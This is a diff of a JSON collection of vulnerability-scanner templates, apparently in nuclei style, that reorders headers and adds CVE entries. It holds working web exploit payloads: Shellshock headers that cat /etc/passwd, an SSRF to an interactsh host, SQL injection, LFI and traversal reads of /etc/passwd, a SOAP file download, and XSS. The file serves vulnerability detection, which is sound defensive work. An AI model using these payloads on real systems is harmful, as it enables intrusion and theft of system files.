@@ -3391,9 +3391,9 @@
       "requests": [
         {
           "headers": {
-            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -10304,8 +10304,8 @@
         {
           "body": "url=https://{{Host}}:443@{{interactsh-url}}\n",
           "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "X-Atlassian-Token": "no-check"
+            "X-Atlassian-Token": "no-check",
+            "Content-Type": "application/x-www-form-urlencoded"
           },
           "method": "POST",
           "path": [
@@ -12249,9 +12249,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
+            "Cookie": "Login",
             "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml",
-            "Cookie": "Login"
+            "content-type": "text/xml"
           },
           "method": "POST",
           "path": [
@@ -19171,6 +19171,20 @@
       ]
     },
     {
+      "id": "CVE-2022-0412",
+      "info": {
+        "name": "TI WooCommerce Wishlist WP plugin < 1.40.1 - SQL Injection",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "@timeout: 10s\nGET /?rest_route=/wc/v3/wishlist/remove_product/1&item_id=0%20union%20select%20sleep(5)%20--%20g HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-0422",
       "info": {
         "name": "WordPress White Label CMS <2.2.9 - Cross-Site Scripting",
@@ -19375,6 +19389,20 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/demo/api/logout?redirect_to=/asdf%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-0679",
+      "info": {
+        "name": "Narnoo Distributor <= 2.5.1 - Unauthenticated LFI to Arbitrary File Read / RCE",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\n\naction=narnoo_distributor_lib_request&lib_path=/etc/passwd\n"
           ]
         }
       ]
@@ -21049,6 +21077,21 @@
       ]
     },
     {
+      "id": "CVE-2022-30512",
+      "info": {
+        "name": "School Dormitory Management System 1.0 - SQL Injection",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/dms/admin/accounts/payment_history.php?account_id=2%27"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-30525",
       "info": {
         "name": "Zyxel Firewall - OS Command Injection",
@@ -21899,6 +21942,23 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/../../../../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-38817",
+      "info": {
+        "name": "Dapr Dashboard - Unauthorized Access",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/components/statestore",
+            "{{BaseURL}}/overview",
+            "{{BaseURL}}/controlplane"
           ]
         }
       ]
